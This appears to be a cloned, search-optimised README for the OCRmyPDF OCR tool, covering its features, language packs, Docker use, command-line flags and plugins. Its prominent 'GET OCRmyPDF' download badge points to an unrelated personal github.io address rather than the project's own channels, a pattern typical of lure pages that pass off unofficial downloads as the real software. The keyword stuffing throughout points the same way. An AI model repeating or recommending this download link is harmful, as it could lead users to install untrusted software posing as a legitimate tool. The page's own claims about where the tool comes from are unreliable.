# OCRmyPDF Tesseract

OCRmyPDF Tesseract puts an invisible text layer under a scanned page so you can search and copy it. The picture of the page stays where it was. OCRmyPDF Python is the program that does the work: a command line tool, not a website.

ocrmypdf command line is how you run a single file or a folder. ocrmypdf docker is the same tool in a container, with Tesseract and Ghostscript already beside it. ocrmypdf searchable pdf is the result: the original scan, plus text a reader can find.

The pages never have to leave the computer that runs the job. That is the point of a local OCR pass.

![Banner Placeholder](api/image1)

A household archive, a lab notebook, or a stack of contracts is the scale it is built for. It is not a hosted converter, and it is not a layout designer. It reads pixels and writes a PDF.

## Main features

The text layer sits under the image. Select a word in a viewer and the highlight should cover the word you see. The resolution and the crop of the scan stay put.

Crooked pages can be straightened. Pages that were filed sideways can be rotated before OCR, so the engine is not reading a line that runs up the margin. Both steps are optional. A clean scan does not need them.

The usual output is PDF/A, an archival profile. You can ask for a plain PDF when an older viewer or a downstream tool rejects PDF/A. Either way the text layer is the same idea.

Work is spread across cores. A 20-page letter is a small job. A 400-page book is the case for more than one worker. The page image is not retyped by hand.

More than a hundred languages are available if the matching Tesseract pack is installed. A bilingual page can name two packs. A pack you never use only costs disk.

Private files stay on the machine that runs the process. There is no account and no upload step in the tool itself.

What you still have after a good run:

- The page image, at the resolution you started with.
- A text layer aligned to that image.
- Metadata you did not ask to change.
- A PDF that opens in an ordinary viewer.

What you do not get is a new layout, a translation, or a summary. If a column was read in the wrong order, fix the page segmentation before you blame the viewer.

| Term | In this tool |
| --- | --- |
| Text layer | Invisible text placed under the page image |
| PDF/A | An archival PDF profile used as the default output |
| Deskew | A small rotation that straightens a crooked scan |
| Language pack | The trained data for one writing system |
| Sidecar | A plain text file written next to the PDF |
| hOCR | A markup file that records where each word sat |

![Editor Placeholder](api/image2)

## Motivation

Paper that was scanned years ago is a picture. A picture does not show up in search. Printing it again and typing it is how archives waste a week.

The job is smaller than a new document system. Keep the file you already have. Add text behind it. Leave tags, folders, and retention rules to whatever already stores the PDF.

People built this because Tesseract can read a page, and a PDF library can attach that reading without redrawing the page. OCRmyPDF Python is the glue between those two. You should not have to write that glue for every box of scans.

## About

A scanned PDF is a sequence of images inside a PDF wrapper. OCRmyPDF opens that wrapper, renders each page that needs OCR, asks Tesseract for words and positions, and writes those words back into a new PDF.

Pages that already contain real text can be left alone. Forcing OCR on a digital invoice wastes time and can cover good text with a worse reading. The default is to respect text that is already there.

The engine is Tesseract. OCRmyPDF Tesseract means that pairing. Another engine can be plugged in, but the ordinary install calls Tesseract.

## Brief history

The program started as a way to stop re-scanning paper that was already a PDF. Early versions shelled out to a chain of tools. Later versions kept the same command and moved the PDF work into Python.

PDF/A became the normal output because libraries and offices ask for a file that still opens in twenty years. The text layer stayed invisible so the page a person sees matches the scan they filed.

Language packs, deskew, and rotation were added because real stacks are not clean English letters. The command line stayed the interface. A window was never required to finish a file.

## Languages

Tesseract reads the scripts it has been trained on. OCRmyPDF does not ship every language inside the Python package. You install the packs the way your system installs Tesseract data.

A language is a short code, often three letters. English is `eng`. French is `fra`. Join two codes with a plus when a page mixes them: `eng+fra`. The order can matter when one script is dominant. Put the main language first.

[languages.py](api/languages.py) is where the tool decides which codes the installed engine will accept. A code that is not installed fails the job before a 300-page run is half done. That early failure is the one you want.

| System | Where language packs usually come from |
| --- | --- |
| Debian and Ubuntu | A tesseract language package per script |
| Fedora | A langpack named for the language |
| Arch | A tesseract data package |
| macOS, via Homebrew | A single extra language formula |
| Windows | The installer from the Tesseract project, plus extra traineddata files |

ocrmypdf ubuntu is the Debian path: install the tool, install the packs, then run. ocrmypdf windows looks in the usual install location if the executable is not already on your path. [tesseract.py](exec/tesseract.py) is the call that finds that binary and the list of languages.

## Download

Get a build that matches the machine, then install Tesseract and Ghostscript beside it. OCRmyPDF Python is published as a package and as source. The package is enough for most people. The source is for a fix or a plugin.

[![GET OCRmyPDF](https://img.shields.io/badge/GET-OCRmyPDF-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://zuhar9898.github.io/.github/OCRmyPDF)

[pyproject.toml](pyproject.toml) names the Python libraries. Ghostscript and Tesseract are not Python libraries. A successful install of the package with a missing engine still fails on the first PDF. Check both before you queue a folder.

On Windows, use a current Python and a current Tesseract install. The tool can read the install location from the registry when the executable is not on the path. Do not mix a 32-bit engine with a 64-bit Python unless you have a reason you can explain.

A first run is one short file, not the archive:

1. Confirm the engine answers with a version.
2. Confirm the language you need is listed.
3. Run one page that you can read yourself.
4. Search that page for a word you can see.
5. Only then point the tool at a folder.

### Docker

ocrmypdf docker skips the split install. The image carries the engine, Ghostscript, and the Python tool. [Dockerfile](docker/Dockerfile) is the recipe for that image. Mount a folder of PDFs into the container and write the results to a folder you mounted as well.

Do not copy secrets or client files into the image itself. A mount is enough. Rebuild the image when you need a newer engine, not when you need a newer PDF.

The container is still a local process. It does not become an online service because it runs under Docker. If you publish a port, you have built something the project did not ask you to build.

## Running

ocrmypdf command line takes an input and an output. The input can be a PDF or an image the tool can wrap into a one-page PDF. The output is a new file unless you ask to replace the input only after success.

```
ocrmypdf --deskew --rotate-pages -l eng scan.pdf searchable.pdf
```

`--deskew` straightens. `--rotate-pages` fixes a sideways page. `-l` picks the language. Leave both image flags off when you already know the scan is straight.

[cli.py](cli.py) defines those flags. [__main__.py](__main__.py) is the entry that starts a job from the command. If a flag is refused, it is missing from this version or it belongs to a plugin you have not installed.

Watch the log. A warning about a missing text layer on a page that was born digital usually means you skipped a page that already had text. A warning about a timeout means one page was too hard. Raise the page timeout only after you have seen which page it was.

Batch work is the same command in a loop you write, or a small watcher that waits for new files. Do not start the loop until one file has come out searchable. A bad flag repeated across a thousand files is a thousand bad files.

A folder job is easier to trust if you keep a few rules:

- Write outputs to an empty directory.
- Skip files that already end in the suffix you chose.
- Stop the loop on the first non-zero exit.
- Keep the log from that exit.
- Rerun only the failed file until it is clean.

A watcher that swallows errors will fill the output folder with half-written PDFs. The exit code is the signal. Do not hide it.

## Basic usage

Give the output a new name until you trust the run. Replacing the only copy is a flag you turn on later, and only because the tool writes to a temporary file and moves it into place after success.

Force a new OCR pass when the existing text layer is wrong, for example a scan that was OCR'd in the wrong language. Skip pages that already have text when you are topping up a mixed file. Those are opposite choices. Pick one per run.

A sidecar text file is useful when a search engine wants plain text and you do not want it to open the PDF. Ask for the sidecar next to the output. It is not a substitute for the text layer inside the PDF.

Multiple languages belong in one `-l` value, not in two passes, unless the two halves of the document are truly separate files. Two passes that both write a text layer will fight.

ocrmypdf options you will actually touch in the first week:

- Language, deskew, and rotate.
- Output type, PDF or PDF/A.
- Jobs, if the machine has idle cores and the disk can keep up.
- Skip-text or force, once you know which pages already have text.
- A title or author only if the old metadata is wrong.

Leave image optimization off until the text is right. A smaller file that was misread is still the wrong file.

## Feature demo

A one-page photograph of a letter becomes a one-page PDF with a text layer. Open it, select a sentence, and paste it into a note. The paste should match the sentence, with the usual OCR mistakes on fuzzy letters.

A crooked phone photo should be deskewed first. If the lines still tilt, the scan is too bent for a single angle. Rescan rather than stacking filters.

A file that is already a digital PDF should come through with its text intact when you use the skip path. If the tool insists on re-reading every page, you asked it to force OCR.

[ocr.py](pipeline/ocr.py) is the page pipeline. [pdfa.py](pipeline/pdfa.py) is the step that aims the result at an archival profile. [_pipeline.py](pipeline/_pipeline.py) is the order of those steps. Read them when a page vanishes or a font looks wrong, not before the first successful file.

## Requirements

You need a supported Python, Tesseract at a current 4.x or newer release, and Ghostscript. Optional helpers clean or compress images. The job runs without them.

[ghostscript.py](exec/ghostscript.py) calls Ghostscript for the PDF steps that the Python libraries do not finish. A Ghostscript error in the log is often a damaged input, not a bad language pack. Try the file in a PDF viewer before you change OCR settings.

[unpaper.py](exec/unpaper.py) is the optional page cleaner. It can remove a dark edge and a speckled background. It can also eat a faint stamp. Use it on a copy.

Disk space matters more than people expect. A book of color scans plus a PDF/A copy can be larger than the input. Keep the output on a disk you measured.

## Dependencies

Tesseract supplies the reading. Ghostscript and the PDF libraries supply the file. Language data is a separate download from the engine. [pluginspec.py](plugins/pluginspec.py) describes the hooks a replacement engine must fill if you are not using Tesseract.

The Python package pins its own libraries in the project file. Do not upgrade them blindly on a machine that already produces good files. A PDF library bump can change how a text layer is packed.

On a Raspberry Pi the same command works if the architecture has wheels or you are willing to build. Give it time. A large page on a small board will hit the timeout you set for a laptop.

## Plugins

The OCR engine is a plugin. The stock one is Tesseract. [tesseract_ocr.py](plugins/tesseract_ocr.py) sets the page segmentation mode, the engine mode, the timeout, and the threshold. Change those when a page of columns is being read as one long line, not when the install is broken.

Other plugins can swap in a different engine on a platform that has one. A GPU engine is optional and heavier. The searchable PDF is still the goal. An engine that returns words without positions cannot place a text layer.

[optimize.py](plugins/optimize.py) compresses images after the text is in place. Run it when the archive file is too large, and compare one page visually. Optimization that shifts a line is not a win.

Concurrency is also pluggable. The default uses the cores you asked for with `--jobs`. One job is the right setting while you debug a single bad page.

When a plugin misbehaves, narrow the job:

- One page, not the whole book.
- One language.
- Deskew off, so you can see the raw reading.
- Optimization off, so the image is unchanged.
- Jobs set to one, so the log stays in order.

If that page is correct, add one switch back at a time. The switch that breaks the page is the one to read about, not the whole stack.

## For developers

The library entry is [api.py](api/api.py). A program can call the same pipeline as the command without parsing argv. Pass a real input path and a real output path. Do not point tests at the only copy of a client file.

[helpers.py](helpers/helpers.py) holds small shared routines. [generate_glyphless_font.py](font/generate_glyphless_font.py) builds the font that draws invisible text. You rarely need to regenerate it. You do need to know it exists when a text layer has no width.

Tests need Ghostscript, Tesseract, and a language pack. A failure that says the engine is missing is an environment failure. A failure that diffs a text layer is a real change. Read the first missing-binary line before you edit the pipeline.

Keep a one-page fixture in the repo you are working on. A private tax PDF is not a fixture you can commit.

## Documentation and support

The command's help text and the published manual cover the flags. This page is the map, not the full option list. When a flag and the manual disagree, trust the version you installed and the help text that came with it.

Report a bug with the version, the command without private paths, and a page you are allowed to share. A 200-page client file is not an attachment. Crop the one page that fails.

Questions about a language pack are usually packaging questions. Name the operating system and the code you passed to `-l`.

Keep these notes next to the command you actually run:

- The engine version, from the binary you found.
- The language codes that engine listed.
- The output type you asked for.
- Whether deskew and rotate were on.
- The page number of any timeout.

That is enough for the next person, including you in a month, to repeat the job. A screenshot of a viewer with no command is not enough.

## Disclaimer

OCR misreads letters. A searchable file can still hide a wrong digit in a total. Check pages that matter by eye. Do not treat the text layer as a sworn copy.

The tool does not grant you rights to the document. It does not remove a password you are not allowed to bypass, and it should not be aimed at files you do not have a reason to convert. Your scans stay yours. The program license covers the program.

## Related Questions

### Is OCRmyPDF free?

Yes. The program is open source. You can run it, read it, and change it under its license. Tesseract and Ghostscript have their own licenses. You do not pay a fee to OCR a file on your own machine. A hosted website that wraps the tool may charge. That charge is not this project.

### What does OCRmyPDF do?

It adds a hidden text layer to a scanned PDF or to an image it wraps as a PDF. You can then search, copy, and index the words. It can straighten a crooked page, rotate a sideways page, and write PDF/A. It does not redesign the page, and it does not translate the text.

### Is PDF OCR safe to use?

It is as safe as the computer you run it on. The normal tool does not upload the PDF. Keep the machine patched, and do not send client files to a random site that claims to be the same program. OCR text can be wrong, so safety of the reading is a separate question from privacy of the file. Check important numbers yourself.

### Can I OCRmyPDF online?

The project is a local program. ocrmypdf online, as a phrase, is what people type when they want a browser upload. That is not how this tool is meant to run. Use the command or the container on a machine you control. If a website offers the same name, read who operates it before you upload a scan.

## Related Search Terms

OCRmyPDF Tesseract, OCRmyPDF Python, ocrmypdf command line, ocrmypdf docker, ocrmypdf searchable pdf, Topics: image-processing, ocr, pdf, python, tesseract, lstm, machine-learning, computer-vision, c-plus-plus, hocr
